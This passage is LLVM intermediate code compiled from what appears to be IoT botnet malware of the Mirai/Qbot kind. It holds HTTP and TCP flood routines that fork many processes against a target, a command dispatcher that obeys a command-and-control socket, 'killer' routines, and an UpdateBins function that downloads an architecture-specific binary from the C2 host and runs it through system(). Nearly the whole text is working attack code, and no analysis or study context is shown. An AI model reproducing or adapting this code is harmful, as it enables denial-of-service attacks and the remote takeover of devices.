  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 bitcast ([3 x i8*]* @__const.sendHTTP.methods to i8*), i64 24, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 bitcast ([3 x i8*]* @__const.sendHTTP.connections to i8*), i64 24, i1 false)
  %19 = call i32 @getdtablesize() #12
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

21:                                               ; preds = %116, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %119

25:                                               ; preds = %21
  %26 = call i32 @fork() #12
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %115

28:                                               ; preds = %25
  br label %29

29:                                               ; preds = %28, %114
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %5, align 4
  %32 = trunc i32 %31 to i16
  %33 = call i32 @socket_connect(i8* %30, i16 zeroext %32)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %105

36:                                               ; preds = %29
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i64 0, i64 0)) #12
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %41 = call i64 @strlen(i8* %40) #11
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = call i32 @rand() #12
  %44 = sext i32 %43 to i64
  %45 = urem i64 %44, 3
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %42, i8* %47) #12
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %51 = call i64 @strlen(i8* %50) #11
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = call i8* @strcpy(i8* %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i64 0, i64 0)) #12
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %56 = call i64 @strlen(i8* %55) #11
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8*, i8** %4, align 8
  %59 = call i8* @strcpy(i8* %57, i8* %58) #12
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %62 = call i64 @strlen(i8* %61) #11
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i8* @strcpy(i8* %63, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i64 0, i64 0)) #12
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %67 = call i64 @strlen(i8* %66) #11
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @rand() #12
  %70 = sext i32 %69 to i64
  %71 = urem i64 %70, 32
  %72 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %71
  %73 = load i8*, i8** %72, align 8
  %74 = call i8* @strcpy(i8* %68, i8* %73) #12
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %77 = call i64 @strlen(i8* %76) #11
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i64 0, i64 0)) #12
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %82 = call i64 @strlen(i8* %81) #11
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @rand() #12
  %85 = sext i32 %84 to i64
  %86 = urem i64 %85, 3
  %87 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %83, i8* %88) #12
  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %92 = call i64 @strlen(i8* %91) #11
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i64 0, i64 0)) #12
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %98 = call i64 @strlen(i8* %97) #11
  %99 = call i64 @write(i32 %95, i8* %96, i64 %98)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i64 0, i64 0
  %102 = call i64 @read(i32 %100, i8* %101, i64 1)
  %103 = load i32, i32* %8, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

105:                                              ; preds = %36, %29
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %9, align 8
  %109 = load i32, i32* %6, align 4
  %110 = sext i32 %109 to i64
  %111 = add nsw i64 %108, %110
  %112 = icmp sge i64 %107, %111
  br i1 %112, label %113, label %114

113:                                              ; preds = %105
  call void @_exit(i32 0) #14
  unreachable

114:                                              ; preds = %105
  br label %29

115:                                              ; preds = %25
  br label %116

116:                                              ; preds = %115
  %117 = load i32, i32* %7, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %7, align 4
  br label %21, !llvm.loop !36

119:                                              ; preds = %21
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendCNC(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #12
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #15
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

22:                                               ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

26:                                               ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22, !llvm.loop !37

34:                                               ; preds = %22
  ret void
}

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @findwritedir() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.killerinfo*, align 8
  %3 = alloca %struct.__dirstream*, align 8
  %4 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i64 0, i64 0))
  store %struct.__dirstream* %4, %struct.__dirstream** %3, align 8
  %5 = icmp eq %struct.__dirstream* %4, null
  br i1 %5, label %6, label %11

6:                                                ; preds = %0
  %7 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %8 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %7, i32 0, i32 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i64 0, i64 0)) #12
  store i32 1, i32* %1, align 4
  br label %20

11:                                               ; preds = %0
  %12 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i64 0, i64 0))
  store %struct.__dirstream* %12, %struct.__dirstream** %3, align 8
  %13 = icmp eq %struct.__dirstream* %12, null
  br i1 %13, label %14, label %19

14:                                               ; preds = %11
  %15 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %16 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %15, i32 0, i32 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i8* @strcpy(i8* %17, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i64 0, i64 0)) #12
  store i32 1, i32* %1, align 4
  br label %20

19:                                               ; preds = %11
  store i32 0, i32* %1, align 4
  br label %20

20:                                               ; preds = %19, %14, %6
  %21 = load i32, i32* %1, align 4
  ret i32 %21
}

declare %struct.__dirstream* @opendir(i8*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getArch() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i64 0, i64 0), i8** %2, align 8
  %3 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  %4 = load i8*, i8** %2, align 8
  %5 = call i8* @strcpy(i8* %3, i8* %4) #12
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  ret i8* %6
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @httpsocket(i8* %0, i32 %1, i8* %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [128 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %15, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = load i32, i32* %7, align 4
  %23 = trunc i32 %22 to i16
  %24 = call zeroext i16 @htons(i16 zeroext %23) #15
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i8*, i8** %6, align 8
  %27 = call i32 @inet_addr(i8* %26) #12
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 577, i32 511)
  store i32 %31, i32* %13, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %32, i32* %12, align 4
  %33 = load i32, i32* %12, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %38, label %35

35:                                               ; preds = %4
  %36 = load i32, i32* %13, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

38:                                               ; preds = %35, %4
  store i32 0, i32* %5, align 4
  br label %109

39:                                               ; preds = %35
  %40 = load i32, i32* %12, align 4
  %41 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %14, align 4
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  store i32 0, i32* %5, align 4
  br label %109

45:                                               ; preds = %39
  %46 = load i8*, i8** %16, align 8
  %47 = call i8* @strcpy(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i64 0, i64 0)) #12
  %48 = load i8*, i8** %16, align 8
  %49 = load i8*, i8** %16, align 8
  %50 = call i64 @strlen(i8* %49) #11
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8*, i8** %8, align 8
  %53 = call i8* @strcpy(i8* %51, i8* %52) #12
  %54 = load i8*, i8** %16, align 8
  %55 = load i8*, i8** %16, align 8
  %56 = call i64 @strlen(i8* %55) #11
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = call i8* @strcpy(i8* %57, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i64 0, i64 0)) #12
  %59 = load i8*, i8** %16, align 8
  %60 = call i64 @strlen(i8* %59) #11
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* %17, align 4
  %62 = load i32, i32* %12, align 4
  %63 = load i8*, i8** %16, align 8
  %64 = load i32, i32* %17, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @write(i32 %62, i8* %63, i64 %65)
  %67 = load i32, i32* %17, align 4
  %68 = sext i32 %67 to i64
  %69 = icmp ne i64 %66, %68
  br i1 %69, label %70, label %71

70:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %109

71:                                               ; preds = %45
  br label %72

72:                                               ; preds = %82, %71
  %73 = load i32, i32* %15, align 4
  %74 = icmp ne i32 %73, 218762506
  br i1 %74, label %75, label %88

75:                                               ; preds = %72
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @read(i32 %76, i8* %18, i64 1)
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %19, align 4
  %79 = load i32, i32* %19, align 4
  %80 = icmp ne i32 %79, 1
  br i1 %80, label %81, label %82

81:                                               ; preds = %75
  store i32 0, i32* %5, align 4
  br label %109

82:                                               ; preds = %75
  %83 = load i32, i32* %15, align 4
  %84 = shl i32 %83, 8
  %85 = load i8, i8* %18, align 1
  %86 = sext i8 %85 to i32
  %87 = or i32 %84, %86
  store i32 %87, i32* %15, align 4
  br label %72, !llvm.loop !38

88:                                               ; preds = %72
  %89 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i64 0, i64 0))
  br label %90

90:                                               ; preds = %88, %98
  %91 = load i32, i32* %12, align 4
  %92 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %93 = call i64 @read(i32 %91, i8* %92, i64 128)
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %20, align 4
  %95 = load i32, i32* %20, align 4
  %96 = icmp sle i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  br label %104

98:                                               ; preds = %90
  %99 = load i32, i32* %13, align 4
  %100 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %101 = load i32, i32* %20, align 4
  %102 = sext i32 %101 to i64
  %103 = call i64 @write(i32 %99, i8* %100, i64 %102)
  br label %90

104:                                              ; preds = %97
  %105 = load i32, i32* %12, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* %13, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1, i32* %5, align 4
  br label %109

109:                                              ; preds = %104, %81, %70, %44, %38
  %110 = load i32, i32* %5, align 4
  ret i32 %110
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @UpdateBins() #0 {
  %1 = alloca %struct.killerinfo*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = call i32 @findwritedir()
  %5 = load %struct.killerinfo*, %struct.killerinfo** %1, align 8
  %6 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %5, i32 0, i32 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i32 @chdir(i8* %7) #12
  %9 = load i8*, i8** %2, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #12
  %11 = load i8*, i8** %2, align 8
  %12 = call i8* @getArch()
  %13 = call i8* @strcpy(i8* %11, i8* %12) #12
  %14 = load i8*, i8** @cncip, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @httpsocket(i8* %14, i32 80, i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i64 0, i64 0))
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %0
  br label %21

19:                                               ; preds = %0
  %20 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #12
  br label %39

21:                                               ; preds = %18
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strcpy(i8* %22, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i64 0, i64 0)) #12
  %24 = load i8*, i8** %3, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = call i64 @strlen(i8* %25) #11
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = call i8* @strcpy(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i64 0, i64 0)) #12
  %29 = load i8*, i8** %3, align 8
  %30 = load i8*, i8** %3, align 8
  %31 = call i64 @strlen(i8* %30) #11
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i8* @strcpy(i8* %32, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i64 0, i64 0)) #12
  %34 = load i8*, i8** %3, align 8
  %35 = call i32 @system(i8* %34)
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i64 0, i64 0))
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #12
  br label %39

39:                                               ; preds = %21, %19
  ret void
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @processCmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i32, align 4
  %43 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #11
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %52, label %49

49:                                               ; preds = %2
  %50 = load i32, i32* @mainCommSock, align 4
  %51 = call i32 (i32, i8*, ...) @sockprintf(i32 %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i64 0, i64 0))
  br label %721

52:                                               ; preds = %2
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i64 0, i64 0)) #11
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %62, label %58

58:                                               ; preds = %52
  call void @UpdateBins()
  %59 = load i32, i32* @pgid, align 4
  %60 = mul nsw i32 %59, -1
  %61 = call i32 @kill(i32 %60, i32 9) #12
  call void @exit(i32 0) #16
  unreachable

62:                                               ; preds = %52
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i64 0, i64 0)) #11
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %89, label %68

68:                                               ; preds = %62
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i64 0, i64 0)) #11
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %78, label %74

74:                                               ; preds = %68
  %75 = call i32 (...) @killer_kill()
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i64 0, i64 0))
  br label %78

78:                                               ; preds = %74, %68
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i64 0, i64 0)) #11
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %88, label %84

84:                                               ; preds = %78
  %85 = call i32 (...) @killer_init()
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i64 0, i64 0))
  br label %88

88:                                               ; preds = %84, %78
  br label %721

89:                                               ; preds = %62
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 0
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i64 0, i64 0)) #11
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %100, label %95

95:                                               ; preds = %89
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %98 = call i8* @inet_ntoa(i32 %97) #12
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i64 0, i64 0), i8* %98)
  br label %721

100:                                              ; preds = %89
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i64 0, i64 0)) #11
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %162, label %106

106:                                              ; preds = %100
  %107 = load i32, i32* %3, align 4
  %108 = icmp slt i32 %107, 4
  br i1 %108, label %121, label %109

109:                                              ; preds = %106
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #11
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %121, label %115

115:                                              ; preds = %109
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #11
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

121:                                              ; preds = %115, %109, %106
  br label %721

122:                                              ; preds = %115
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %5, align 8
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #11
  store i32 %129, i32* %6, align 4
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #11
  store i32 %133, i32* %7, align 4
  %134 = load i8*, i8** %5, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #11
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %153

137:                                              ; preds = %122
  %138 = load i8*, i8** %5, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %139, i8** %8, align 8
  br label %140

140:                                              ; preds = %150, %137
  %141 = load i8*, i8** %8, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %152

143:                                              ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %150, label %146

146:                                              ; preds = %143
  %147 = load i8*, i8** %8, align 8
  %148 = load i32, i32* %6, align 4
  %149 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %147, i32 %148, i32 %149)
  call void @_exit(i32 0) #14
  unreachable

150:                                              ; preds = %143
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #12
  store i8* %151, i8** %8, align 8
  br label %140, !llvm.loop !39

152:                                              ; preds = %140
  br label %161

153:                                              ; preds = %122
  %154 = call i32 @listFork()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

156:                                              ; preds = %153
  br label %721

157:                                              ; preds = %153
  %158 = load i8*, i8** %5, align 8
  %159 = load i32, i32* %6, align 4
  %160 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #14
  unreachable

161:                                              ; preds = %152
  br label %721

162:                                              ; preds = %100
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i64 0, i64 0)) #11
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %226, label %168

168:                                              ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 4
  br i1 %170, label %183, label %171

171:                                              ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 2
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #11
  %176 = icmp slt i32 %175, 1
